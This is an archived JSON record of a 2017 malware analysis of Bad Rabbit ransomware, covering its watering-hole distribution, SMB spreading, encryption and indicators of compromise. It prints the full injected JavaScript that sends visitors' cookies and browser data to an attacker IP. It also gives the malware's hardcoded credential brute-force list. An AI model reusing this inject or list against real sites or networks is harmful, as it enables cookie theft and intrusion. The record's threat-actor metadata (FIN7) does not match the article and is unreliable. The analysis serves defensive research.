{
    "id": "ea5ed258-7581-41b0-a40b-7d643d079bf2",
    "created_at": "2023-01-12T15:00:09.02508Z",
    "updated_at": "2025-03-27T02:13:29.176426Z",
    "deleted_at": null,
    "sha1_hash": "5234e16d9ab1dca083c813bd6074ec4c859b4cbf",
    "title": "2017-10-24 - Bad Rabbit- Not‑Petya is back with improved ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T16:10:37Z",
    "file_modification_date": "2022-05-28T16:10:37Z",
    "file_size": 1240141,
    "plain_text": "# Bad Rabbit: Not‑Petya is back with improved ransomware\n\n**welivesecurity.com/2017/10/24/bad-rabbit-not-petya-back/**\n\nOctober 24, 2017\n\nA new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some\ndetails about this new variant of Petya.\n\n[Marc-Etienne M.Léveillé](https://www.welivesecurity.com/author/marc-etienne/)\n24 Oct 2017 - 08:48PM\n\nA new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some\ndetails about this new variant of Petya.\n\n_UPDATE (October 27 – 15:35 CEST): A new_ _[report suggested that EternalRomance – one of the leaked NSA tools – has](http://blog.talosintelligence.com/2017/10/bad-rabbit.html)_\n_been used to spread Diskcoder.D in the network. We were able to confirm this by installing the out-of-life-cycle patch_\n_MS17-010 (a patch addressing vulnerabilities misused by the leaked NSA exploits), which stopped the further spread of_\n_the malware via IPC share._\n\n\n-----\n\n[A new ransomware outbreak today and has hit some major infrastructure in Ukraine including Kiev metro. Here are some](https://www.welivesecurity.com/2017/10/24/kiev-metro-hit-new-variant-infamous-diskcoder-ransomware/)\nof the details about this new variant.\n\n## Drive-by download via watering hole on popular sites\n\nOne of the distribution method of Bad Rabbit is via drive-by download. Some popular websites are compromised and have\nJavaScript injected in their HTML body or in one of their .js files.\n\nHere is a beautified version of the inject:\n\nJavaScript\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\nfunction e(d) {\n\nvar xhr = null;\n\nif (!!window.XMLHttpRequest) {\n\nxhr = new XMLHttpRequest();\n\n} else if (!!window.ActiveXObject) {\n\nvar xhrs = ['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0', 'Msxml2.XMLHTTP.6.0'];\n\nfor (var i = 0; i < xhrs.length; i++) {\n\ntry {\n\n\n-----\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n\nxhr ActiveXObject(xhrs[i]);\n\nbreak;\n\n} catch (e) {}\n\n}\n\n}\n\nif (!!xhr) {\n\nxhr.open('POST', 'http://185.149.120\\.3/scholargoogle/');\n\nxhr.timeout = 10000;\n\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n\nxhr.onreadystatechange = function() {\n\nif (xhr.readyState == 4 && xhr.status == 200) {\n\nvar resp = xhr.responseText;\n\nif (resp) {\n\nvar fans = JSON.parse(resp);\n\nif (fans) {\n\nvar an_s = decodeURIComponent(fans.InjectionString).replace(/\\+/g, '%20');\n\nvar da = document.createElement('div');\n\nda.id = 'ans';\n\nda.innerHTML = an_s;\n\ndocument.body.appendChild(da);\n\n}\n\n}\n\n}\n\n};\n\nvar pd = [];\n\nfor (var k in d) {\n\nif (d.hasOwnProperty(k)) {\n\npd.push(k + '=' + d[k]);\n\n}\n\n}\n\nvar dc = pd.join('&');\n\nxhr.send(dc);\n\n}\n\n}\n\ne({\n\n'agent': navigator.userAgent,\n\n\n-----\n\n45\n\n46\n\n47\n\n48\n\n49\n\n\nreferer : document.referrer,\n\n'cookie': document.cookie,\n\n'domain': window.location.hostname,\n\n'c_state': !!document.cookie\n\n});\n\n\nThis script reports the following to 185.149.120[.]3, which doesn’t seem to respond at the moment.\n\nBrowser User-Agent\nReferrer\nCookie from the visited site\nDomain name of the visited site\n\nServer side logic can determine if the visitor is of interest and then add content to the page. In that case, what we have\nseen is that a popup asking to download an update for Flash Player is shown in the middle of the page.\n\nWhen clicking on the “Install” button, download of an executable file from 1dnscontrol[.]com is initiated. This executable\nfile, install_flash_player.exe is the dropper for Win32/Diskcoder.D.\n\nFinally the computer is locked and the malware shows the ransom note:\n\n\n-----\n\nThe payment page:\n\n## Spreading via SMB\n\n\n-----\n\nWin32/Diskcoder.D has the ability to spread via SMB. As opposed to some public claims, it does not use the EternalBlue\nvulnerability like the Win32/Diskcoder.C (Not-Petya) outbreak. First, it scans internal networks for open SMB shares. It\nlooks for the following shares:\n\nadmin\natsvc\nbrowser\neventlog\nlsarpc\nnetlogon\nntsvcs\nspoolss\nsamr\nsrvsvc\nscerpc\nsvcctl\nwkssvc\n\nMimikatz is launched on the compromised computer to harvest credentials. A hardcoded list of usernames and passwords\nis also present.\n\n**Usernames** **Passwords**\n\nAdministrator Administrator\n\nAdmin administrator\n\nGuest Guest\n\nUser guest\n\nUser1 User\n\nuser-1 user\n\nTest Admin\n\nroot adminTest\n\nbuh test\n\nboss root\n\nftp 123\n\nrdp 1234\n\nrdpuser 12345\n\nrdpadmin 123456\n\nmanager 1234567\n\nsupport 12345678\n\nwork 123456789\n\nother user 1234567890\n\noperator Administrator123\n\nbackup administrator123\n\nasus Guest123\n\n\n-----\n\n**Usernames** **Passwords**\n\nftpuser guest123\n\nftpadmin User123\n\nnas user123\n\nnasuser Admin123\n\nnasadmin admin123Test123\n\nsuperuser test123\n\nnetguest password\n\nalex 111111\n\n55555\n\n77777\n\n777\n\nqwe\n\nqwe123\n\nqwe321\n\nqwer\n\nqwert\n\nqwerty\n\nqwerty123\n\nzxc\n\nzxc123\n\nzxc321\n\nzxcv\n\nuiop\n\n123321\n\n321\n\nlove\n\nsecret\n\nsex\n\ngod\n\nWhen working credentials are found, the infpub.dat file is dropped into the Windows directory and executed through\nSCManager and rundll.exe.\n\n## Encryption\n\n\n-----\n\nWin32/Diskcoder.D is modified version of Win32/Diskcoder.C. Bugs in file encryption were fixed. The encryption now uses\n[DiskCryptor, an open source legitimate software used to do full drive encryption. Keys are generated using](https://diskcryptor.net/)\nCryptGenRandom and then protected by a hardcoded RSA 2048 public key.\n\nLike before, AES-128-CBC is used.\n\n## Distribution\n\nInterestingly, ESET telemetry shows that Ukraine accounts only for 12.2% of the total number of times we have seen the\ndropper component Here are the statistics:\n\nRussia: 65%\nUkraine: 12.2%\nBulgaria: 10.2%\nTurkey: 6.4%\nJapan: 3.8%\nOther: 2.4%\n\nThis pretty much matches the distribution of compromised websites that include the malicious JavaScript. So why does\nUkraine seem to be more hit than the rest?\n\nIt’s interesting to note that all these big companies were all hit at the same time. It is possible that the group already had a\nfoot inside their network and launched the watering hole attack at the same time as a decoy. Nothing says they fell for the\n“Flash update”. ESET is still investigating and we will post our finding as we discover them.\n\n## Samples\n\n**SHA-1** **Filename** **ESET Detection name** **Description**\n\n`79116fe99f2b421c52ef64097f0f39b815b20907` infpub.dat Win32/Diskcoder.D Diskcoder\n\n`afeee8b4acff87bc469a6f0364a81ae5d60a2add` dispci.exe Win32/Diskcoder.D Lockscreen\n\n`413eba3973a15c1a6429d9f170f3e8287f98c21c` Win32/RiskWare.Mimikatz.X Mimikatz (32bits)\n\n`16605a4a29a101208457c47ebfde788487be788d` Win64/Riskware.Mimikatz.X Mimikatz (64bits)\n\n`de5c8d858e6e41da715dca1c019df0bfb92d32c0` install_flash_player.exe Win32/Diskcoder.D Dropper\n\n`4f61e154230a64902ae035434690bf2b96b4e018` page-main.js JS/Agent.NWC JavaScript on\ncompromised\nsites\n\n## C&C servers\n\nPayment site: http://caforssztxqzf2nm[.]onion\n\nInject URL: http://185.149.120[.]3/scholargoogle/\n\nDistribution URL: hxxp://1dnscontrol[.]com/flash_install.php\n\nList of compromised sites:\n\nhxxp://argumentiru[.]com\nhxxp://www.fontanka[.]ru\nhxxp://grupovo[.]bg\nhxxp://www.sinematurk[.]com\nhxxp://www.aica.co[.]jp\nhxxp://spbvoditel[ ]ru\n\n\n-----\n\nhxxp://argumenti[.]ru\nhxxp://www.mediaport[.]ua\nhxxp://blog.fontanka[.]ru\nhxxp://an-crimea[.]ru\nhxxp://www.t.ks[.]ua\nhxxp://most-dnepr[.]info\nhxxp://osvitaportal.com[.]ua\nhxxp://www.otbrana[.]com\nhxxp://calendar.fontanka[.]ru\nhxxp://www.grupovo[.]bg\nhxxp://www.pensionhotel[.]cz\nhxxp://www.online812[.]ru\nhxxp://www.imer[.]ro\nhxxp://novayagazeta.spb[.]ru\nhxxp://i24.com[.]ua\nhxxp://bg.pensionhotel[.]com\nhxxp://ankerch-crimea[.]ru\n\n24 Oct 2017 - 08:48PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-10-24 - Bad Rabbit- Not‑Petya is back with improved ransomware.pdf"
    ],
    "report_names": [
        "2017-10-24 - Bad Rabbit- Not‑Petya is back with improved ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535609,
    "ts_updated_at": 1743041609,
    "ts_creation_date": 1653754237,
    "ts_modification_date": 1653754237,
    "files": {
        "pdf": "https://archive.orkl.eu/5234e16d9ab1dca083c813bd6074ec4c859b4cbf.pdf",
        "text": "https://archive.orkl.eu/5234e16d9ab1dca083c813bd6074ec4c859b4cbf.txt",
        "img": "https://archive.orkl.eu/5234e16d9ab1dca083c813bd6074ec4c859b4cbf.jpg"
    }
}